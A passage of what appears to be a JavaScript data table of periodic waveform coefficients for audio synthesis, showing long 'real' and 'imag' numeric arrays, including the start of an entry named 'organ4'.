0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000106, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000003, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, .196487, 0, 0, -.000003, 0, 0, 0, -.000002, 0, 0, 0, 0, 0, 0, 0, -.000007, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000018, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000006, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000006, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.00001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "organ4",      { real: [ 0, 0, -.06072, .030357, -.015136, .006684, -.003512, .002544, -.002455, .002315, -.001264, .004643, -.000089, .000353, -.000165, .000152, -.000145, .000184, -.000123, .000216, -.000135, .000222, -.000219, .000066, -.000701, .000387, -.000125, .000341, -.000117, .004817, -.000568, .003995, -.000035, .000438, -.00028, .000426, -.000038, .000078, -.000108, .000272, -.000161, .000111, -.000165, .000191, -.000156, .000209, -.000072, .000054, -.000111, .001741, -.000161, .001192, -.000127, .000053, -.000044, .000062, -.000095, .00002, -.000102, .000148, -.000051, .00015, -.0001, .000096, -.000095, .000115, -.000081, .000062, -.000022, .000134, -.00008, .000184, -.000018, .000023, -.000044, .000049, -.000057, .000024, -.000033, .000035, -.000057, .000031, -.000044, .000043, -.00001, .000004, -.000062, .000016, -.00005, .000062, -.000051, .00009, -.000036, .000029, -.00005, .000029, -.000025, .000035, -.000036, .000031, -.000028, .000038, -.000064, .000014, -.000031, .000025, -.000042, .000032, -.000045, .000076, -.000025, .000021, -.000029, .000057, -.000019, .000003, -.000039, .000062, -.000035, .000027, -.000024, .000003, -.000051, .000041, -.000047, .000043, -.000039, .000036, -.000045, .000025, -.000067, .000029, -.000021, .000022, -.000038, .000047, -.000029, .000021, -.000037, .000022, -.000047, .000017, -.000051, .000041, -.000031, .000025, -.000013, .000018, -.000041, .000015, -.000018, .000015, -.000022, .00003, -.00003, .000021, -.000027, .000044, -.000023, .000019, -.000024, .00001, -.00002, .000045, -.000038, .000014, -.000017, .000022, -.000025, .00002, -.00001, .000025, -.000004, .000008, -.000013, .000012, -.000028, .000023, -.000022, .000027, -.000008, .000021, -.000016, .000007, -.000022, .000025, -.000008, .000005, -.000005, .000024, -.000025, .000015, -.000017, .000015, -.000012, .000027, -.000023, .000033, -.000004, .000018, -.000026, .000013, -.000012, .000017, -.000021, .000004, -.000015, .000013, -.000002, .000018, -.000011, .000009, -.000016, .000007, -.000009, .000007, -.000009, .00001, -.000018, .000027, -.000011, .000009, -.000012, .000015, -.000019, .000006, -.000008, .00001, -.000007, .000013, -.000005, .000008, -.000018, .000016, -.000015, .000007, -.000011, .000018, -.000012, .00001, -.000019, .000008, -.000008, .000005, -.000001, .000016, -.000008, .000011, -.000002, .000008, -.000013, .000019, -.000005, .00001, -.000012, .000015, -.000016, .000017, -.000013, .000007, -.000013, .000022, -.000012, .000015, -.000012, .00001, -.000009, .000016, -.000012, .000007, -.000008, .000011, -.000007, .000015, -.000005, .000008, -.000001, .000009, -.000015, .000001, -.000012, .000013, -.000012, .000007, -.000013, .000011, -.000013, .000006, -.000008, .000012, -.000005, .000004, -.000005, .000006, -.000013, .000012, -.00001, .000006, -.000007, .000016, -.00001, .000006, -.000006, .000007, -.000007, .000009, -.000009, .000009, -.000008, .000009, -.000008, .000008, -.000008, .000007, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, 